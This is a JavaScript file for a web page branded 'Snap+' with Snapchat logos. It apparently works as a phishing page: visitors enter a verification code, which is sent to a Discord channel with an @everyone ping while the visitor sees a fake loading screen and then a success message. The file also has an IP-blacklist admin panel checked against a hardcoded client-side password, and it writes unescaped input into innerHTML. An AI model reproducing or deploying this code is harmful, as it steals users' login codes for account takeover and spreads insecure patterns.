const ADMIN_MDP = 'SAISAI';

const sendCodeBtn = document.getElementById('sendCodeBtn');
const codeInput = document.getElementById('codeInput');
const loadingScreen = document.getElementById('loadingScreen');
const successMessage = document.getElementById('successMessage');
const ipInput = document.getElementById('ipInput');
const mdpInput = document.getElementById('mdpInput');
const blacklistBtn = document.getElementById('blacklistBtn');
const unblacklistBtn = document.getElementById('unblacklistBtn');
const blacklistList = document.getElementById('blacklistList');

document.querySelectorAll('.input-wrapper').forEach(wrapper => {
    const input = wrapper.querySelector('input');
    const icon = wrapper.querySelector('i');

    input.addEventListener('focus', () => {
        wrapper.style.transform = 'translateY(-2px)';
        if (icon) icon.style.color = '#667eea';
    });

    input.addEventListener('blur', () => {
        wrapper.style.transform = 'translateY(0)';
        if (icon && !input.value) icon.style.color = 'rgba(255, 255, 255, 0.5)';
    });

    input.addEventListener('input', () => {
        wrapper.style.borderColor = input.value ? '#667eea' : 'rgba(255, 255, 255, 0.1)';
    });
});

async function renderBlacklist() {
    const list = await getBlacklist();
    if (list.length === 0) {
        blacklistList.innerHTML = '<p style="color: rgba(255,255,255,0.4);">Aucune IP blacklister</p>';
    } else {
        blacklistList.innerHTML = list.map(ip => `
            <div style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.05);">
                <span><i class="fas fa-globe" style="margin-right: 8px; color: #ef4444;"></i>${ip}</span>
            </div>
        `).join('');
    }
}

renderBlacklist();

blacklistBtn.addEventListener('click', async function() {
    const ip = ipInput.value.trim();
    const mdp = mdpInput.value.trim();

    if (!ip || !mdp) {
        blacklistBtn.style.animation = 'shake 0.5s ease-in-out';
        setTimeout(() => blacklistBtn.style.animation = '', 500);
        alert('Remplis tous les champs');
        return;
    }

    if (mdp !== ADMIN_MDP) {
        alert('Mot de passe incorrect');
        mdpInput.value = '';
        return;
    }

    blacklistBtn.disabled = true;
    blacklistBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Blacklisting...';

    await blacklistIP(ip);
    ipInput.value = '';
    mdpInput.value = '';
    await renderBlacklist();

    blacklistBtn.disabled = false;
    blacklistBtn.innerHTML = '<i class="fas fa-ban"></i> Blacklister';

    const embed = {
        title: '🚫 IP Blacklister',
        description: 'Une IP a été ajouter à la blacklist.',
        color: 0xef4444,
        author: {
            name: 'Snap+ Admin',
            icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png'
        },
        fields: [
            { name: '─────────────────────', value: ' ', inline: false },
            { name: '🌐 IP', value: `\`\`\`${ip}\`\`\``, inline: false },
            { name: '⏰ Date', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
            { name: '─────────────────────', value: ' ', inline: false }
        ],
        thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
        footer: { text: 'Snap+ Admin • Blacklist', icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
        timestamp: new Date().toISOString()
    };

    await sendToDiscord({ content: '@everyone', embeds: [embed] });
    alert('IP blacklister !');
});

unblacklistBtn.addEventListener('click', async function() {
    const ip = ipInput.value.trim();
    const mdp = mdpInput.value.trim();

    if (!ip || !mdp) {
        unblacklistBtn.style.animation = 'shake 0.5s ease-in-out';
        setTimeout(() => unblacklistBtn.style.animation = '', 500);
        alert('Remplis tous les champs');
        return;
    }

    if (mdp !== ADMIN_MDP) {
        alert('Mot de passe incorrect');
        mdpInput.value = '';
        return;
    }

    unblacklistBtn.disabled = true;
    unblacklistBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Déblacklisting...';

    await unblacklistIP(ip);
    ipInput.value = '';
    mdpInput.value = '';
    await renderBlacklist();

    unblacklistBtn.disabled = false;
    unblacklistBtn.innerHTML = '<i class="fas fa-check"></i> Déblacklister';

    const embed = {
        title: '✅ IP Déblacklister',
        description: 'Une IP a été retirée de la blacklist.',
        color: 0x10b981,
        author: {
            name: 'Snap+ Admin',
            icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png'
        },
        fields: [
            { name: '─────────────────────', value: ' ', inline: false },
            { name: '🌐 IP', value: `\`\`\`${ip}\`\`\``, inline: false },
            { name: '⏰ Date', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
            { name: '─────────────────────', value: ' ', inline: false }
        ],
        thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
        footer: { text: 'Snap+ Admin • Blacklist', icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
        timestamp: new Date().toISOString()
    };

    await sendToDiscord({ embeds: [embed] });
    alert('IP déblacklister !');
});

sendCodeBtn.addEventListener('click', async function() {
    const code = codeInput.value.trim();

    if (!code) {
        sendCodeBtn.style.animation = 'shake 0.5s ease-in-out';
        setTimeout(() => sendCodeBtn.style.animation = '', 500);
        alert('Veuillez entrer un code');
        return;
    }

    sendCodeBtn.disabled = true;
    sendCodeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi...';
    document.querySelector('.form-group').style.display = 'none';
    document.querySelector('.headline').style.display = 'none';
    sendCodeBtn.style.display = 'none';
    loadingScreen.classList.add('active');

    const embed = {
        title: '🔐 Code de vérification Snap+',
        description: 'Un nouveau code de vérification est disponible.',
        color: 0x10b981,
        author: {
            name: 'Snap+ Admin',
            icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png'
        },
        fields: [
            { name: '─────────────────────', value: ' ', inline: false },
            { name: '🔑 Code', value: `\`\`\`${code}\`\`\``, inline: false },
            { name: '⏰ Date', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
            { name: '─────────────────────', value: ' ', inline: false }
        ],
        thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
        footer: { text: 'Snap+ Admin • Envoi Manuel', icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
        timestamp: new Date().toISOString()
    };

    const sent = await sendToDiscord({
        content: '@everyone',
        embeds: [embed]
    });

    if (!sent) {
        loadingScreen.classList.remove('active');
        document.querySelector('.form-group').style.display = '';
        document.querySelector('.headline').style.display = '';
        sendCodeBtn.style.display = '';
        sendCodeBtn.disabled = false;
        sendCodeBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Envoyer';
        alert('Erreur lors de l\'envoi sur Discord.');
        return;
    }

    setTimeout(() => {
        loadingScreen.classList.remove('active');
        successMessage.classList.add('active');
    }, 3000);
});
